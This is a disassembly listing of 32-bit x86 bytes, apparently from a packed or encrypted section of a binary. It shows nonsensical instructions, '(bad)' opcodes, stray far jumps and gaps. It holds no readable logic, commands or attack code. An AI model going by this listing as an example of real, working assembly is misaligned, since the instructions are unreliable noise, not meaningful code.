  42b3ab:	out    0x8,eax
  42b3ad:	xor    BYTE PTR [esi+0x3e],ch
  42b3b0:	cdq    
  42b3b1:	jmp    0xfef1fbd8
  42b3b6:	cmp    edi,DWORD PTR [ebp+0x127c182]
  42b3bc:	arpl   dx,bp
  42b3be:	pop    ebx
  42b3bf:	ins    DWORD PTR es:[edi],dx
  42b3c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b3c1:	jb     0x42b42a
  42b3c3:	mov    ch,0xf9
  42b3c5:	mov    ebx,DWORD PTR [ecx]
  42b3c7:	lahf   
  42b3c8:	xchg   esp,eax
  42b3c9:	mov    ds:0xddafc9cc,eax
  42b3ce:	xor    ebx,DWORD PTR [ebp-0x31d08160]
  42b3d4:	mov    eax,0xa0fa0f1a
  42b3d9:	ficom  WORD PTR [eax+0x49]
  42b3dc:	or     DWORD PTR [edx+0x6c],ebp
  42b3df:	jnp    0x42b387
  42b3e1:	push   ebp
  42b3e2:	arpl   WORD PTR [eax+0x728f246a],dx
  42b3e8:	lea    eax,[ecx-0x5f]
  42b3eb:	inc    ebp
  42b3ec:	repz rol BYTE PTR [ebp-0x57],0x55
  42b3f1:	mov    ds:0x77696e86,al
  42b3f6:	mov    bh,0x88
  42b3f8:	dec    esp
  42b3f9:	add    eax,0xf49395ed
  42b3fe:	push   ebx
  42b3ff:	mov    dl,0xaf
  42b401:	jmp    0x1381:0x4172aca7
  42b408:	push   0xc6231ac9
  42b40d:	pop    ebp
  42b40e:	push   ecx
  42b40f:	sbb    al,BYTE PTR [edi+edi*8+0x29]
  42b413:	pushf  
  42b414:	popa   
  42b415:	fcom   DWORD PTR [ecx]
  42b417:	nop
  42b418:	es jb  0x42b3bf
  42b41b:	lock outs dx,BYTE PTR ds:[esi]
  42b41d:	ret    
  42b41e:	push   ds
  42b41f:	pop    ss
  42b420:	cmp    al,al
  42b422:	push   edx
  42b423:	add    esp,DWORD PTR [ebp-0x56]
  42b426:	cmp    BYTE PTR [edx+0x23],0xbb
  42b42a:	mov    BYTE PTR [ecx],bl
  42b42c:	in     eax,0xe
  42b42e:	imul   edx,DWORD PTR [ebp-0x7d57b34e],0x67b552b9
  42b438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b439:	ins    BYTE PTR es:[edi],dx
  42b43a:	fbld   TBYTE PTR [edx-0x40e3bb4f]
  42b440:	jmp    0x77d7b350
  42b445:	xor    ch,ah
  42b447:	mov    eax,ds:0x8eb1be84
  42b44c:	jo     0x42b446
  42b44e:	add    BYTE PTR [edi],ch
  42b450:	rcl    BYTE PTR [esi-0x80],1
  42b453:	aad    0xf5
  42b455:	mov    edx,0x31c780c9
  42b45a:	inc    DWORD PTR [edi-0x11803957]
  42b460:	sub    bl,BYTE PTR [edx+0x49]
  42b463:	cmp    eax,0x37030752
  42b468:	jecxz  0x42b480
  42b46a:	mov    esi,0x16f9
	...
  42b4d3:	add    BYTE PTR [eax],al
  42b4d5:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b4db:	out    dx,eax
  42b4dc:	into   
  42b4dd:	gs jo  0x42b4b0
  42b4e0:	cld    
  42b4e1:	test   esp,ecx
  42b4e3:	adc    al,0x11
  42b4e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b4e6:	outs   dx,BYTE PTR ds:[esi]
  42b4e7:	iret   
  42b4e8:	add    DWORD PTR [eax],eax
  42b4ea:	inc    DWORD PTR [eax]
  42b4ec:	add    BYTE PTR [eax],al
  42b4ee:	xor    BYTE PTR [esi],bl
  42b4f0:	mov    ebx,0xb6ea4cdb
  42b4f5:	push   ebp
  42b4f6:	xor    BYTE PTR [eax+0x2ab4e2e9],dh
  42b4fc:	push   esp
  42b4fd:	inc    edx
  42b4fe:	sahf   
  42b4ff:	jmp    0x7ed9:0x73e04a83
  42b506:	adc    edi,DWORD PTR [ebp+ebp*4+0x652f304b]
  42b50d:	leave  
  42b50e:	into   
  42b50f:	push   edx
  42b510:	sbb    eax,0xfa0be8c1
  42b515:	inc    ecx
  42b516:	or     DWORD PTR [edi+0x42],eax
  42b519:	fld    QWORD PTR [esi-0x3361e4d3]
  42b51f:	lock sbb dh,BYTE PTR [edx+0x9ebc056]
  42b526:	and    eax,ecx
  42b528:	dec    ebp
  42b529:	or     al,0x42
  42b52b:	fimul  WORD PTR [ebx+eiz*2+0x3a]
  42b52f:	mov    BYTE PTR [eax-0x66],bl
  42b532:	inc    ebx
  42b533:	mov    bl,0xad
  42b535:	ins    BYTE PTR es:[edi],dx
  42b536:	mov    dh,0x6
  42b538:	sbb    ch,BYTE PTR [ebp+0x3]
  42b53b:	sub    dl,BYTE PTR ds:0x3ad836a1
  42b541:	pop    eax
  42b542:	fiadd  DWORD PTR [eax+0x6f2b95d9]
  42b548:	xchg   ebp,eax
  42b549:	inc    edi
  42b54a:	xchg   ecx,eax
  42b54b:	mov    fs,WORD PTR [esi+0xd]
  42b54e:	mov    al,BYTE PTR [ebx]
  42b550:	jg     0x42b553
  42b552:	outs   dx,BYTE PTR ds:[esi]
  42b553:	mov    ebp,0xf2f04c44
  42b558:	dec    esp
  42b559:	mov    esi,0xf52a386d
  42b55e:	and    al,0xad
  42b560:	push   ebx
  42b561:	or     DWORD PTR [ebx-0x6743c358],0xffffff91
  42b568:	push   eax
  42b569:	add    eax,0xd22a2e55
  42b56e:	aad    0xb2
  42b570:	sbb    eax,DWORD PTR [ebp+ebx*4+0x13]
  42b574:	nop
  42b575:	sbb    al,bh
  42b577:	lods   al,BYTE PTR ds:[esi]
  42b578:	outs   dx,BYTE PTR ds:[esi]
  42b579:	cmp    DWORD PTR [edx],eax
  42b57b:	fcom   DWORD PTR [esi+0x60db13fe]
  42b581:	ret    
  42b582:	je     0x42b52d
  42b584:	mov    edx,0x44594a8e
  42b589:	cwde   
  42b58a:	bound  edi,QWORD PTR [esi]
  42b58c:	mov    esi,0x4a607943
  42b591:	fild   QWORD PTR [eax]
  42b593:	fst    st(3)
  42b595:	xor    eax,DWORD PTR [esi+esi*2-0x3e7a8023]
  42b59c:	mov    ebx,0x4b13b1ae
  42b5a1:	lahf   
  42b5a2:	xor    DWORD PTR [ebx+0x4a],ebp
  42b5a5:	in     al,0xe9
  42b5a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b5a8:	loope  0x42b577
  42b5aa:	addr16 pusha 
  42b5ac:	out    dx,eax
  42b5ad:	cmp    DWORD PTR [edx+edx*4-0x23],ecx
  42b5b1:	inc    ebp
  42b5b2:	mov    BYTE PTR [ebx+0x42],cl
  42b5b5:	je     0x42b5e7
  42b5b7:	jb     0x42b5d1
  42b5b9:	clc    
  42b5ba:	cmp    DWORD PTR [esi],ecx
  42b5bc:	test   edx,esp
  42b5be:	add    edi,DWORD PTR [ecx+0x4bb7574c]
  42b5c4:	jecxz  0x42b562
  42b5c6:	stos   BYTE PTR es:[edi],al
  42b5c7:	dec    edx
  42b5c8:	sub    BYTE PTR ss:[edi+0x64],ch
  42b5cc:	in     eax,dx
  42b5cd:	in     al,0xe1
  42b5cf:	test   BYTE PTR [edx-0x3d],ah
  42b5d2:	gs add ah,dl
  42b5d5:	mov    esi,DWORD PTR [ebp-0x6d3d6c5b]
  42b5db:	mov    ecx,0x690b8f0
  42b5e0:	dec    DWORD PTR [esi+0x5]
  42b5e3:	cdq    
  42b5e4:	mov    dh,0x65
  42b5e6:	push   ecx
  42b5e7:	xchg   ebp,eax
  42b5e8:	xor    BYTE PTR [edx+esi*1+0x29],dl
  42b5ec:	data16 add BYTE PTR [eax],al
	...
  42b653:	add    BYTE PTR [eax],al
  42b655:	add    al,ah
  42b657:	xchg   esp,eax
  42b658:	and    bh,cl
  42b65a:	je     0x42b65b
  42b65c:	out    dx,eax
  42b65d:	mov    edi,0x1397875f
  42b662:	je     0x42b679
  42b664:	pxor   mm5,QWORD PTR [ebp-0x30]
  42b668:	add    DWORD PTR [eax],eax
  42b66a:	inc    DWORD PTR [eax]
  42b66c:	add    BYTE PTR [eax],al
  42b66e:	mov    dh,0xf
  42b670:	xor    eax,0x4c9ebbba
  42b675:	pop    ebp
  42b676:	dec    esp
  42b677:	mov    edi,0x5649511b
  42b67c:	jge    0x42b6d9
  42b67e:	pop    ebx
  42b67f:	xor    ebp,DWORD PTR [edi]
  42b681:	adc    eax,0x3aa90663
  42b686:	and    BYTE PTR [eax-0x60],ch
  42b689:	pop    edi
  42b68a:	xor    al,0xbe
  42b68c:	sub    dl,BYTE PTR [eax-0x46738b8f]
  42b692:	push   edx
  42b693:	jl     0x42b6ac
  42b695:	xchg   ecx,eax
  42b696:	mov    ?,WORD PTR [esi+0x15]
  42b699:	mov    bl,0x8f
  42b69b:	sub    eax,0xc8bbfd79
  42b6a0:	adc    cl,ch
  42b6a2:	test   eax,0xc6c1ee3
  42b6a7:	dec    eax
  42b6a8:	or     edx,eax
  42b6aa:	sub    al,0xe2
  42b6ac:	cmp    al,0x54
  42b6ae:	adc    eax,0x5ad6e5ab
  42b6b3:	xor    DWORD PTR [esi-0x74],ebp
  42b6b6:	cmp    BYTE PTR [esi],ah
  42b6b8:	outs   dx,DWORD PTR ss:[esi]
  42b6ba:	add    DWORD PTR [esi+0x2cc3ca6c],0xffffffcc
  42b6c1:	cmp    BYTE PTR [esi+0x58],cl
  42b6c4:	jg     0x42b6ee
  42b6c6:	neg    BYTE PTR [ebx-0x4cd5d664]
  42b6cc:	push   0x19
  42b6ce:	ffree  st(4)
  42b6d0:	jmp    DWORD PTR [esi-0x10969b29]
  42b6d6:	arpl   WORD PTR [eax],dx
  42b6d8:	and    esi,DWORD PTR [eax]
  42b6da:	repz js 0x42b661
  42b6dd:	jle    0x42b67c
  42b6df:	shr    DWORD PTR [ecx+0xc],cl
  42b6e2:	addr16 or al,0x13
  42b6e5:	or     DWORD PTR [ebx-0x477b4e3],ebp
  42b6eb:	or     BYTE PTR [ebx-0x55486990],ah
  42b6f1:	shl    esp,0x61
  42b6f4:	mov    WORD PTR [edx+ebx*1-0x228f5a9a],?
  42b6fb:	icebp  
  42b6fc:	cwde   
  42b6fd:	test   BYTE PTR ds:0xe2cb679e,0xce
  42b704:	rcl    BYTE PTR [esi],1
  42b706:	sub    ebx,0x39
  42b709:	jnp    0x42b717
  42b70b:	mov    BYTE PTR [ecx],cl
  42b70d:	popf   
  42b70e:	into   
  42b70f:	out    dx,al
  42b710:	sahf   
  42b711:	dec    esp
  42b712:	gs lock pop esi
  42b715:	jmp    0x42b720
  42b717:	repz jnp 0x42b6ed
  42b71a:	mov    ah,0xa9
  42b71c:	ret    
  42b71d:	sub    al,0xd1
  42b71f:	stc    
  42b720:	out    0x7d,al
  42b722:	xchg   BYTE PTR [ebx+0x7cf9206c],cl
  42b728:	push   ecx
  42b729:	rcl    BYTE PTR [ecx+eiz*1-0x1c],cl
  42b72d:	inc    ebp
  42b72e:	mov    ds,edx
  42b730:	jle    0x42b798
  42b732:	sub    eax,0x3a861df9
  42b737:	and    esi,eax
  42b739:	rol    BYTE PTR [edx-0x7],1
  42b73c:	dec    edx
  42b73d:	cdq    
  42b73e:	adc    esi,DWORD PTR [edx+0xaaba800]
  42b744:	cmp    BYTE PTR [edx],bh
  42b746:	inc    eax
  42b747:	push   0x994349a6
  42b74c:	or     al,0x97
  42b74e:	mov    cl,0xd6
  42b750:	stos   BYTE PTR es:[edi],al
  42b751:	nop
  42b752:	jecxz  0x42b711
  42b754:	mov    esp,0xbed238f2
  42b759:	mov    ah,0x1b
  42b75b:	xor    al,0x25
  42b75d:	lds    ebp,FWORD PTR [esi-0x6e]
  42b760:	test   esi,eax
  42b762:	adc    BYTE PTR [edx],al
  42b764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b765:	jns    0x42b6ed
  42b767:	aaa    
  42b768:	push   0x49ec3d00
	...
  42b7d5:	add    BYTE PTR [esi+0x42],cl
  42b7d8:	dec    ecx
  42b7d9:	daa    
  42b7da:	dec    ebp
  42b7db:	das    
  42b7dc:	outs   dx,BYTE PTR ds:[esi]
  42b7dd:	imul   edx,edx,0x63
  42b7e0:	push   ecx
  42b7e1:	xchg   edx,eax
  42b7e2:	imul   BYTE PTR [eax]
  42b7e4:	and    eax,esi
  42b7e6:	ins    BYTE PTR es:[edi],dx
  42b7e7:	rol    DWORD PTR [ecx],1
  42b7e9:	add    bh,bh
  42b7eb:	add    BYTE PTR [eax],al
  42b7ed:	add    BYTE PTR [esi],bh
  42b7ef:	call   0xaac60816
  42b7f4:	jns    0x42b7cc
  42b7f6:	xor    al,0xce
  42b7f8:	adc    ebx,ecx
  42b7fa:	cmp    dl,BYTE PTR [esi]
  42b7fc:	aaa    
  42b7fd:	push   ss
  42b7fe:	dec    edi
  42b7ff:	inc    ebx
  42b800:	pop    ebx
  42b801:	jecxz  0x42b855
  42b803:	mov    ecx,0x7b215fa7
  42b808:	sub    eax,esi
  42b80a:	stc    
  42b80b:	out    0xf8,al
  42b80d:	jb     0x42b88e
  42b80f:	xor    DWORD PTR [edi+0x6],0xffffffd9
  42b813:	clc    
  42b814:	pusha  
  42b815:	test   DWORD PTR [edx],edi
  42b817:	call   0x67e0d83c
  42b81c:	(bad)  
  42b81d:	(bad)  
  42b81e:	sub    BYTE PTR [ebx],ch
  42b820:	jno    0x42b854
  42b822:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b823:	pop    ebp
  42b824:	push   0x46f454f5
  42b829:	ds in  eax,0x79
  42b82c:	fmul   DWORD PTR [ecx-0x7ecc027b]
  42b832:	xor    DWORD PTR [edi],eax
  42b834:	mov    eax,0xe3a29180
  42b839:	cs xchg ecx,eax
  42b83b:	pop    ds
  42b83c:	sub    dh,BYTE PTR [esi+0x13]
  42b83f:	jmp    0xbfd4a216
  42b844:	and    DWORD PTR [ebx+edx*2],edx
  42b847:	mov    esp,0x84eeede7
  42b84c:	push   esi
  42b84d:	jmp    0xe20f:0x29398437
  42b854:	add    eax,0xb9321c51
  42b859:	retf   
  42b85a:	aad    0xd3
  42b85c:	icebp  
  42b85d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b85e:	daa    
  42b85f:	(bad)  
  42b860:	call   0xdff3:0x33b049c6
  42b867:	mov    bh,0x89
  42b869:	jae    0x42b84f
  42b86b:	sbb    bh,al
  42b86d:	push   edi
  42b86e:	mov    ds:0x6b672e62,al
  42b873:	jp     0x42b8ea
  42b875:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b877:	add    bh,BYTE PTR [esi]
  42b879:	stc    
  42b87a:	xchg   edi,eax
  42b87b:	cdq    
  42b87c:	popa   
  42b87d:	or     eax,0xff3c1c45
  42b882:	in     eax,dx
  42b883:	ins    DWORD PTR es:[edi],dx
  42b884:	call   0x90e11238
  42b889:	aaa    
  42b88a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b88b:	lods   eax,DWORD PTR ds:[esi]
  42b88c:	fwait
  42b88d:	mov    esi,0xb874f984
  42b892:	mov    esi,esp
  42b894:	sar    BYTE PTR [ebx],1
  42b896:	add    edi,edx
  42b898:	jne    0x42b84f
  42b89a:	mov    ecx,0x359f4ae2
  42b89f:	add    eax,0xd6b42579
  42b8a4:	and    DWORD PTR [ecx],0xf088fed9
  42b8aa:	data16 (bad) 
  42b8ac:	mov    bl,0x5
  42b8ae:	and    cl,cl
  42b8b0:	push   eax
  42b8b1:	lea    ebp,[ecx]
  42b8b3:	lods   eax,DWORD PTR ds:[esi]
  42b8b4:	retf   0xdb37
  42b8b7:	arpl   WORD PTR [edi],bx
  42b8b9:	ins    DWORD PTR es:[edi],dx
  42b8ba:	lods   al,BYTE PTR ds:[esi]
  42b8bb:	mov    bh,bh
  42b8bd:	push   esi
  42b8be:	adc    bh,BYTE PTR [esi-0x1bf5fa03]
  42b8c4:	push   ebp
  42b8c5:	mov    esp,0x53486666
  42b8ca:	sbb    ch,BYTE PTR [edx-0x458a72de]
  42b8d0:	mov    esi,0x687f0de3
  42b8d5:	rdtsc  
  42b8d7:	pusha  
  42b8d8:	sbb    dh,BYTE PTR [esi]
  42b8da:	es inc ecx
  42b8dc:	(bad)  
  42b8de:	push   es
  42b8df:	mov    ebx,0xe198ef38
  42b8e4:	std    
  42b8e5:	jb     0x42b943
  42b8e7:	mov    WORD PTR [ebx],ds
  42b8e9:	cmp    ecx,DWORD PTR [ecx]
  42b8eb:	sub    DWORD PTR [eax+0x0],0x0
	...
  42b953:	add    BYTE PTR [eax],al
  42b955:	add    al,ch
  42b957:	popf   
  42b958:	mov    esi,0xf9e7ffe7
  42b95d:	lahf   
  42b95e:	ret    0x608c
  42b961:	or     ebx,DWORD PTR [ebp-0x9]
  42b964:	sbb    eax,DWORD PTR [ebx]
  42b966:	imul   edx,edx,0x1
  42b969:	add    bh,bh
  42b96b:	add    BYTE PTR [eax],al
  42b96d:	add    BYTE PTR [ecx+0x42fb9fb9],bh
  42b973:	push   ebx
  42b974:	xor    edx,DWORD PTR [esi]
  42b976:	pusha  
  42b977:	mov    ds:0x8b3d2440,al
  42b97c:	xor    DWORD PTR [ebp+0x68cd95fb],ebx
  42b982:	sbb    al,0xf1
  42b984:	or     dh,BYTE PTR ds:0xc48e8da4
  42b98a:	push   edx
  42b98b:	mov    edx,0x15d3d704
  42b990:	mov    ecx,0x9718dc8e
  42b995:	inc    esi
  42b997:	retf   
  42b998:	dec    ebp
  42b999:	(bad)  
  42b99b:	mov    ds:0xe0b8a735,al
  42b9a0:	lods   eax,DWORD PTR ds:[esi]
  42b9a1:	sti    
  42b9a2:	lds    ecx,FWORD PTR [bp+di]
  42b9a5:	xor    BYTE PTR [eax+esi*1],dl
  42b9a8:	adc    eax,0x885f5e4d
  42b9ad:	mov    DWORD PTR [ecx-0x7cb0d2df],esp
  42b9b3:	mov    BYTE PTR [esi],cl
  42b9b5:	sub    cl,BYTE PTR [ebx]
  42b9b7:	imul   ecx,DWORD PTR [edx-0x75],0x1f973ad4
  42b9be:	jmp    0x42b951
  42b9c0:	cld    
  42b9c1:	add    ebp,ebx
  42b9c3:	rcl    DWORD PTR [bx-0x4a1a],cl
  42b9c8:	les    eax,FWORD PTR [edi]
  42b9ca:	scas   eax,DWORD PTR es:[edi]
  42b9cb:	xchg   ebp,eax
  42b9cc:	lods   al,BYTE PTR ds:[esi]
  42b9cd:	or     ecx,edx
  42b9cf:	xchg   ebx,eax
  42b9d0:	mov    esp,0xbbb3ab54
  42b9d5:	rcr    BYTE PTR [esi+0x6f90051e],cl
  42b9db:	or     al,BYTE PTR [eax+0x52]
  42b9de:	loop   0x42b98c
  42b9e0:	ret    
  42b9e1:	cmp    ebx,edx
  42b9e3:	xor    ebx,ecx
  42b9e5:	pop    edi
  42b9e6:	imul   edx,DWORD PTR [ebp-0x61],0xffffff9e
  42b9ea:	jmp    0xf7e7:0xb127f65d
  42b9f1:	and    BYTE PTR [eax-0x40],0xb7
  42b9f5:	addr16 js 0x42ba5b
  42b9f8:	and    al,0x84
  42b9fa:	pop    es
  42b9fb:	inc    eax
  42b9fc:	aas    
  42b9fd:	or     DWORD PTR [edx+0x6737fd47],edx
  42ba03:	inc    eax
  42ba04:	cs xchg edi,eax
  42ba06:	pusha  
  42ba07:	adc    eax,0x73d5078b
  42ba0c:	retf   
  42ba0d:	or     BYTE PTR [eax+0x9],0x22
  42ba11:	cwde   
  42ba12:	cmp    ebp,eax
  42ba14:	pop    edi
  42ba15:	cmp    DWORD PTR [edi+0x618f5581],ebp
  42ba1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ba1c:	xor    BYTE PTR [ebp+eiz*1-0x61715f96],bl
  42ba23:	mov    ecx,0x34c6fbe7
  42ba28:	ins    DWORD PTR es:[edi],dx
  42ba29:	ja     0xd2904ad1
  42ba2f:	loop   0x42baa5
  42ba31:	jo     0x42ba38
  42ba33:	lock adc al,0x92
  42ba36:	test   BYTE PTR [ebx-0x648ccf9f],ch
  42ba3c:	outs   dx,BYTE PTR ds:[esi]
  42ba3d:	and    eax,0x3c85e12b
  42ba42:	je     0x42ba24
  42ba44:	test   BYTE PTR [eax+eiz*8-0x4d],bh
  42ba48:	loop   0x42ba68
  42ba4a:	cmp    DWORD PTR [edx-0x11],edi
  42ba4d:	jns    0x42ba79
  42ba4f:	xchg   ebx,eax
  42ba50:	add    esi,DWORD PTR [eax+edx*2-0x5c780287]
  42ba57:	rol    bl,1
  42ba59:	adc    BYTE PTR [eax+edi*8],0xd1
  42ba5d:	popa   
  42ba5e:	cmp    eax,DWORD PTR [eax+0xa98b66d]
  42ba64:	(bad)  
  42ba65:	adc    edi,DWORD PTR [esi-0x4d79c6bd]
  42ba6b:	or     dl,BYTE PTR [ebp+0x0]
	...
  42bad5:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42badb:	neg    ebx
  42badd:	outs   dx,DWORD PTR ds:[esi]
  42bade:	push   0x5b
  42bae0:	xchg   ecx,eax
  42bae1:	or     DWORD PTR [edi+0x6ad2ab92],ebx
  42bae7:	rol    DWORD PTR [ecx],cl
  42bae9:	add    bh,bh
  42baeb:	add    BYTE PTR [eax],al
  42baed:	add    BYTE PTR [edx],ch
  42baef:	xor    eax,esp
  42baf1:	cs pusha 
  42baf3:	mov    al,0x35
  42baf5:	sahf   
  42baf6:	arpl   WORD PTR [edi+0x3ad101f0],bx
  42bafc:	inc    esi
  42bafd:	mov    bl,0xad
  42baff:	and    eax,0x1ea612a6
  42bb04:	xchg   esp,eax
  42bb05:	pop    ss
  42bb06:	mov    eax,ds:0x9e99e584
  42bb0b:	pop    esi
  42bb0c:	adc    al,0x3e
  42bb0e:	dec    esi
  42bb0f:	mov    bl,0x62
  42bb11:	jb     0x42baee
  42bb13:	ds jmp 0x34eef86b
  42bb19:	jmp    0x72d:0x88e9edee
  42bb20:	mov    esp,0x1c4cb8de
  42bb25:	out    0x19,eax
  42bb27:	inc    esi
  42bb28:	jmp    0x42bae8
  42bb2a:	or     edx,ebx
  42bb2c:	jmp    0xa33e70df
  42bb31:	fdiv   DWORD PTR [esi+ebp*2]
  42bb34:	mov    WORD PTR [esi],cs
  42bb36:	mov    eax,ds:0x65ef64ba
  42bb3b:	inc    ebp
  42bb3c:	neg    DWORD PTR es:[ebx+0x9]
  42bb40:	push   ebp
  42bb41:	ss xchg edi,eax
  42bb43:	and    ah,ah
  42bb45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bb46:	bound  eax,QWORD PTR [ebx-0x67]
  42bb49:	ds sbb bh,ah
  42bb4c:	repz jecxz 0x42bb9c
  42bb4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bb50:	aad    0xea
  42bb52:	mov    ds:0x7e327f9c,al
  42bb57:	and    ebx,edx
  42bb59:	add    ah,BYTE PTR [ecx]
  42bb5b:	adc    ebp,DWORD PTR ds:0xf11a9855
  42bb61:	xchg   edx,eax
  42bb62:	aaa    
  42bb63:	test   DWORD PTR [edi+0x6a],0x27d83be0
  42bb6a:	pop    ebx
  42bb6b:	cwde   
  42bb6c:	ins    BYTE PTR es:[edi],dx
  42bb6d:	mov    ecx,0xa313ccfb
  42bb72:	pop    es
  42bb73:	or     DWORD PTR [esp+edx*8+0x2a],ecx
  42bb77:	xor    bh,BYTE PTR [esi+0x42]
  42bb7a:	aam    0x93
  42bb7c:	pushf  
  42bb7d:	push   ecx
  42bb7e:	adc    al,0x1b
  42bb80:	add    eax,0x535b2886
  42bb85:	cs mov edi,0x6a7496a3
  42bb8b:	retf   0xdbe6
  42bb8e:	push   esp
  42bb8f:	rcr    DWORD PTR ds:0x7395ce8d,cl
  42bb95:	or     DWORD PTR [edx+eax*2+0x34da2868],0x1f
  42bb9d:	sub    al,0xc5
  42bb9f:	sahf   
  42bba0:	mov    edx,0xdea8ef3e
  42bba5:	call   0xb48d5e74
  42bbaa:	jbe    0x42bb5b
  42bbac:	cmp    esi,edi
  42bbae:	sub    dl,BYTE PTR [esi]
  42bbb0:	sar    DWORD PTR [esi+0x791016d],1
  42bbb6:	sub    eax,0x770a13e6
  42bbbb:	ds sahf 
  42bbbd:	mov    dh,BYTE PTR [ebx+0x32ca3d87]
  42bbc3:	ins    BYTE PTR es:[edi],dx
  42bbc4:	pushf  
  42bbc5:	ret    0x8804
  42bbc8:	(bad)  
  42bbc9:	rol    DWORD PTR ds:0x3baa237b,1
  42bbcf:	mov    ecx,0x63196f96
  42bbd4:	or     ecx,0xe6aa262c
  42bbda:	push   es
  42bbdb:	xor    dh,dh
  42bbdd:	(bad)  
  42bbde:	call   0x8b592ede
  42bbe3:	pop    ss
  42bbe4:	add    bl,BYTE PTR [ebp-0x57]
  42bbe7:	pop    es
  42bbe8:	js     0x42bb7c
  42bbea:	(bad)  
  42bbeb:	push   edx
  42bbec:	pop    edx
	...
  42bc55:	add    BYTE PTR [eax+ebp*1],dh
  42bc58:	add    DWORD PTR [esi],eax
  42bc5a:	sbb    eax,0x233a372f
  42bc5f:	sub    DWORD PTR [ebx],eax
  42bc61:	dec    ecx
  42bc62:	out    0xc7,eax
  42bc64:	sbb    al,0x3e
  42bc66:	imul   edx,esp,0xff0001
  42bc6c:	add    BYTE PTR [eax],al
  42bc6e:	sub    eax,0x282c709
  42bc73:	xchg   ecx,eax
  42bc74:	aam    0x11
  42bc76:	inc    eax
  42bc77:	dec    ebp
  42bc78:	xchg   ebx,eax
  42bc79:	pushf  
  42bc7a:	mov    dh,0x8e
  42bc7c:	mov    edx,0xc440902a
  42bc81:	ins    BYTE PTR es:[edi],dx
  42bc82:	pop    ebx
  42bc83:	sbb    BYTE PTR [edi+0x41aed1c4],ch
  42bc89:	pop    ss
  42bc8a:	lea    edi,[esi-0xd4479f3]
  42bc90:	push   edi
  42bc91:	and    BYTE PTR [edi+ebp*1],al
  42bc94:	ins    BYTE PTR es:[edi],dx
  42bc95:	ret    
  42bc96:	mov    al,0x56
  42bc98:	pop    edi
  42bc99:	outs   dx,BYTE PTR ds:[esi]
  42bc9a:	add    edx,DWORD PTR [edx-0x1d]
  42bc9d:	or     ebx,edi
  42bc9f:	mov    ecx,0x23a0cea0
  42bca4:	loope  0x42bd10
  42bca6:	ret    
  42bca7:	mov    esi,0xe13bea66
  42bcac:	dec    ebx
  42bcad:	jmp    DWORD PTR [edi+edx*1+0x64]
  42bcb1:	or     DWORD PTR [edx+0x37d09d8a],ebp
  42bcb7:	lea    ebx,[ecx-0x3a74adf1]
  42bcbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bcbe:	or     ah,bh
  42bcc0:	or     ah,BYTE PTR [esi-0x3a]
  42bcc3:	mov    BYTE PTR [esi-0x44],dh
  42bcc6:	push   ss
  42bcc7:	pop    ebx
  42bcc8:	jno    0x42bc9e
  42bcca:	call   0x213f:0xfe319c3d
  42bcd1:	xchg   esi,eax
  42bcd2:	pop    esp
  42bcd3:	fdiv   QWORD PTR [ecx+0x5e]
  42bcd6:	cmp    al,0xbe
  42bcd8:	pop    ebx
  42bcd9:	ds mov ?,eax
  42bcdc:	into   
  42bcdd:	jne    0x42bd1e
  42bcdf:	clc    
  42bce0:	test   eax,0xea76e914
  42bce5:	and    eax,0x30cff416
  42bcea:	and    esp,DWORD PTR [edx-0x6ecfd7fb]
  42bcf0:	in     eax,0x91
  42bcf2:	cmp    dh,BYTE PTR [eax]
  42bcf4:	jge    0x42bd51
  42bcf6:	outs   dx,BYTE PTR ds:[esi]
  42bcf7:	and    cl,0x3e
  42bcfa:	in     al,0xe2
  42bcfc:	jp     0x42bcbf
  42bcfe:	xchg   esi,eax
  42bcff:	ss jo  0x42bd7a
  42bd02:	pop    esi
  42bd03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bd04:	lahf   
  42bd05:	sti    
  42bd06:	mov    dh,BYTE PTR [ebx+0x73]
  42bd09:	mov    dh,0x75
  42bd0b:	in     eax,0xca
  42bd0d:	pop    eax
  42bd0e:	inc    esi
  42bd0f:	bnd je 0x42bcb9
  42bd12:	xor    al,0x73
  42bd14:	lahf   
  42bd15:	mov    eax,?
  42bd17:	stc    
  42bd18:	js     0x42bd82
  42bd1a:	sbb    al,0xa
  42bd1c:	int    0x49
  42bd1e:	data16 ficom WORD PTR [edx+0x33]
  42bd22:	jne    0x42bd80
  42bd24:	push   0x3
  42bd26:	jg     0x42bd9f
  42bd28:	mov    WORD PTR [ecx],cs
  42bd2a:	jp     0x42bcd2
  42bd2c:	push   edx
  42bd2d:	and    DWORD PTR [esp+ebp*1+0x4554ec6f],esi
  42bd34:	jmp    0x9b4c81d3
  42bd39:	retf   
  42bd3a:	shr    DWORD PTR [ecx],cl
  42bd3c:	js     0x42bd48
  42bd3e:	jg     0x42bd05
  42bd40:	je     0x42bcf7
  42bd42:	fimul  WORD PTR [eax+0x47]
  42bd45:	icebp  
  42bd46:	mov    DWORD PTR [eax+0x6c],ebx
  42bd49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bd4a:	imul   ebx,DWORD PTR ds:0xbeb786d3,0x49f502de
  42bd54:	mov    ebp,0xbd438b4a
  42bd59:	stc    
  42bd5a:	pop    esi
  42bd5b:	pusha  
  42bd5c:	mov    ecx,0xe6760b37
  42bd61:	sub    BYTE PTR [edi-0x223072ca],dl
  42bd67:	jb     0x42bd84
  42bd69:	arpl   WORD PTR [esp+edi*1-0x6],si
	...
  42bdd5:	add    BYTE PTR [eax-0x61eb634a],dh
  42bddb:	ds mov eax,0xffec3b6
  42bde1:	jae    0x42be53
  42bde3:	jmp    FWORD PTR [edx]
  42bde5:	inc    esp
  42bde6:	push   0xff0001d5
  42bdeb:	add    BYTE PTR [eax],al
  42bded:	add    ah,bh
